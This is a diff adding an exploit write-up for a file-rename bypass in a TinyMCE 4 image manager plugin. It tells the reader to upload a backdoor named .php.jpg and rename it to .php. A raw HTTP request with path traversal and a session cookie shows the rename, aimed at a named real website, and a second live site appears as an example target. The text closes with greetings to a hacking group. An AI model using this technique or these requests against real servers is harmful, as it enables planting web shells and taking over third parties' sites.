@@ -1,0 +1,34 @@
+Exploit Title   : TinyMCE 4 Image Manager Bypass Change Extension
+Author          : ice-cream - khunerable
+Vendor Homepage : -
+Vendor Github   : -
+Date            : 16 Mey 2018
+Tested on       : Ubuntu 16.04.2 LTS ( BackBox ), Windows 7
+
+Dork :
+USE UR BRAIN
+
+Poc :
+[-] Upload Ur Backdoor Extension .php.jpg
+[-] Rename Backdoor .php.jpg to .php ( dont forgot to use burpsuite )
+
+------------------------------------------------------------------------------------------------------------------
+GET /application/assets/admin/js/tinymce/plugins/image/rename_file.php?dummy=1526415811634&path=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fcontent%2Fuploads%2F&new_name=rename ur file and delete jpg.php.jpg&current_name=FILE-20180515-2215L9PSQ9TGNJC7.jpg HTTP/1.1
+Host: www.jac-pharmapxi.fr
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://www.jac-pharmapxi.fr/application/assets/admin/js/tinymce/plugins/image/image.php
+X-Requested-With: XMLHttpRequest
+Cookie: PHPSESSID=17f30bf76e744845c82493b336abb7e5
+Connection: close
+------------------------------------------------------------------------------------------------------------------
+
+example :
+http://azyb.az/admin/media/tinymce/plugins/image/image.php
+
+thnks to :
+First Thnks for My Darling :*
+
+DayWalker - ZombieRoot - AnoaGhost - Tint0nz - Speedy-03 - All member Typical Idiot Security And Zerobyte.id Family.
